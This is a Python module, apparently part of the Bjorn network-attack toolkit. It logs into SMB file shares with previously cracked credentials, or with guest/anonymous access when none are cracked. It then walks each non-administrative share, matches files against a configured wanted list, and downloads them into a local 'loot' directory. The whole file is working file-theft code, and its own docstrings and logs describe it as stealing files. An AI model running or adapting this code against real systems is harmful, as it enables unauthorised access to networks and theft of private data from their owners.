"""
steal_files_smb.py - Connects to SMB shares with cracked credentials (or anonymous),
finds files matching the steal_file_* config, and downloads them.

#12: scaffolding lives in base_stealer.BaseStealer. SMB's topology is share-centric and its
credentials file carries a share column the others do not, so load_credentials and harvest are
overridden; the base's ROOT/find_files loop is not used.
"""

import logging
import os
from smb.SMBConnection import SMBConnection

from base_stealer import (
    BaseStealer, MAX_DEPTH, MAX_FILES_PER_RUN, MAX_FILE_BYTES, MAX_RUN_BYTES, MIN_FREE_BYTES,
)
from logger import Logger
from shared import SharedData

logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)

b_class = "StealFilesSMB"
b_module = "steal_files_smb"
b_status = "steal_files_smb"
b_parent = "SMBBruteforce"
b_port = 445

IGNORED_SHARES = {
    'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$',
    'Sharename', '---------', 'SMB1',
}


class StealFilesSMB(BaseStealer):
    """Steal files from SMB shares (including anonymous access)."""

    CRED_FILE_ATTR = "smbfile"
    LOOT_SUBDIR = "smb"
    CONNECTED_FLAG = "smb_connected"
    LOGGER = logger

    def load_credentials(self, ip):
        """Cracked (user, password) pairs for this IP, plus guest/anonymous first.

        The smb.csv has a share column the other protocol CSVs lack; we still extract
        user/password and let harvest list shares on a successful session. Share-specific
        auth that only works on one share is still attempted because every unique
        (user, password) pair is tried.
        """
        path = getattr(self.shared_data, self.CRED_FILE_ATTR)
        credentials = []
        seen = set()
        if os.path.exists(path):
            with open(path, 'r') as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split(',')
                    if len(parts) > 5 and parts[1] == ip:
                        user, password = parts[4], parts[5]
                        key = (user, password)
                        if key not in seen:
                            seen.add(key)
                            credentials.append(key)
            logger.info(f"Found {len(credentials)} unique credentials for {ip}")
        # Guest/anonymous first so open shares are tried without a prior crack.
        if ('guest', '') not in seen and ('', '') not in seen:
            credentials = [('guest', '')] + credentials
        return credentials

    def open_session(self, ip, username, password):
        """Connect; share is chosen later inside harvest."""
        conn = SMBConnection(
            username, password, "Bjorn", "Target",
            use_ntlm_v2=True, is_direct_tcp=True,
        )
        conn.connect(ip, 445, timeout=10)
        self.mark_connected()
        logger.info(f"Connected to {ip} via SMB with username {username}")
        return conn

    def list_shares(self, conn):
        try:
            shares = conn.listShares()
            valid = [
                s for s in shares
                if s.name not in IGNORED_SHARES and not s.isSpecial and not s.isTemporary
            ]
            logger.info(f"Found valid shares: {[s.name for s in valid]}")
            return valid
        except Exception as e:
            logger.error(f"Error listing shares: {e}")
            return []

    def find_files(self, conn, share_name, dir_path='/', depth=0, visited=None):
        """Walk one share with depth/visited/file caps."""
        if visited is None:
            visited = set()
        files = []
        if depth > MAX_DEPTH:
            return files
        key = (share_name, (dir_path or '/').replace('\\', '/').rstrip('/') or '/')
        if key in visited:
            logger.warning(f"SMB cycle detected at {share_name}:{dir_path}; stopping recurse")
            return files
        visited.add(key)
        try:
            for file in conn.listPath(share_name, dir_path):
                if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
                    break
                if len(files) >= MAX_FILES_PER_RUN:
                    logger.warning(
                        f"SMB file cap ({MAX_FILES_PER_RUN}) reached under {share_name}:{dir_path}")
                    break
                if file.isDirectory:
                    if file.filename not in ('.', '..'):
                        files.extend(self.find_files(
                            conn, share_name,
                            os.path.join(dir_path, file.filename),
                            depth=depth + 1, visited=visited,
                        ))
                else:
                    if self.matches_wanted(file.filename):
                        files.append(os.path.join(dir_path, file.filename))
            logger.info(f"Found {len(files)} matching files in {dir_path} on share {share_name}")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} in share {share_name}: {e}")
        return files

    def steal_file(self, conn, share_name, remote_file, local_dir):
        """Stream with mid-stream byte caps."""
        if not self.check_budget(local_dir):
            return
        local_file_path = None
        try:
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)

            written = [0]

            def _write(chunk):
                written[0] += len(chunk)
                if written[0] > MAX_FILE_BYTES:
                    raise IOError(f"file exceeds MAX_FILE_BYTES ({MAX_FILE_BYTES})")
                if getattr(self, '_run_bytes', 0) + written[0] > MAX_RUN_BYTES:
                    raise IOError(f"run would exceed MAX_RUN_BYTES ({MAX_RUN_BYTES})")
                f.write(chunk)

            with open(local_file_path, 'wb') as f:
                class _Cap:
                    def write(self, data):
                        _write(data)
                conn.retrieveFile(share_name, remote_file, _Cap())
            self.note_bytes(written[0])
            logger.success(
                f"Downloaded file from {remote_file} to {local_file_path} ({written[0]} bytes)")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from share {share_name}: {e}")
            try:
                if local_file_path and os.path.exists(local_file_path):
                    os.unlink(local_file_path)
            except OSError:
                pass

    def harvest(self, conn, ip, row):
        """Override: list shares on the live session, then find + steal per share.

        The base ROOT/find_files shape does not fit SMB; this keeps the per-share structure
        that was already present before the #12 conversion.
        """
        local_base = self.loot_dir(ip, row)
        any_stolen = False
        shares = self.list_shares(conn)
        for share in shares:
            if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
                break
            share_name = share.name
            remote_files = self.find_files(conn, share_name, '/')
            if not remote_files:
                continue
            local_dir = os.path.join(local_base, share_name)
            for remote_file in remote_files:
                if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
                    break
                self.steal_file(conn, share_name, remote_file, local_dir)
            any_stolen = True
            logger.success(
                f"Successfully stolen {len(remote_files)} file(s) from "
                f"{ip} share '{share_name}'")
        return any_stolen


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_smb = StealFilesSMB(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
